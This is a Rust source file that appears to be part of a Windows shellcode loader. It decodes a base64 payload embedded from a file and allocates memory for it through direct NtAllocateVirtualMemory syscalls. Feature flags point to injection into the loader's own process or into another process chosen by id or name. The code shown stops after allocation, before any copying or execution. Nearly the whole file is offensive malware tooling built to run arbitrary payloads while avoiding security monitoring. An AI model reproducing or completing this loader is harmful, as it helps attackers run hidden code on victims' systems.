use std::error::Error;

#[allow(unused_imports)]
use crate::debug_error;
#[allow(unused_imports)]
use crate::debug_ok_msg;
#[allow(unused_imports)]
use crate::debug_base_msg;
#[allow(unused_imports)]
use crate::debug_base_hex;
#[allow(unused_imports)]
use crate::debug_success_msg;
#[allow(unused_imports)]
use crate::debug_base;

use crate::winapi::{syscall_wrapper::SyscallWrapper, types::HANDLE};
use crate::winapi::constants::STATUS_SUCCESS;

#[allow(dead_code)]
pub fn do_load()
{
    let shell_code = get_shell_code_base64();
    //let shell_code = get_shell_code();
    debug_success_msg!("Shellcode loaded !");
    match load(shell_code) {
        Ok(_) => {},
        Err(e) => {
            debug_error!(e);
        }
    }
}

#[allow(dead_code)]
fn get_shell_code_base64() -> Vec<u8> {
    let base64_shell_code = include_str!("payload.b64");
    crate::helpers::base64_to_vec(base64_shell_code)
}

#[cfg(all(feature = "inject_self", not(feature = "inject_proc_id"), not(feature = "inject_proc_name")))]
fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
    use crate::winapi::constants::{MEM_RESERVE, MEM_COMMIT, PAGE_READWRITE};

    let mut size: usize = shell_code.len();
    let mut address: usize = 0;
    let ntdll = SyscallWrapper::new();
    let process_handle: HANDLE = -1;

    crate::debug_ok_msg!(format!("Call to NtAllocateVirtualMemory"));
    let nt_allocate_virtual_memory_res = ntdll.nt_allocate_virtual_memory(process_handle, &mut address,  &mut size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    crate::debug_info_msg!(format!("Call to NtAllocateVirtualMemory : Result = {:#x}", nt_allocate_virtual_memory_res));
    // crate::debug_info!(size);
    // crate::debug_info_hex!(address);
    if nt_allocate_virtual_memory_res != STATUS_SUCCESS {
        return Err(Box::from(format!("Failed to allocate memory (size = {})", size)));
    }

    debug_success_msg!(format!("Memory allocated : {}b at {:#x}", size, address));
    Ok(())
}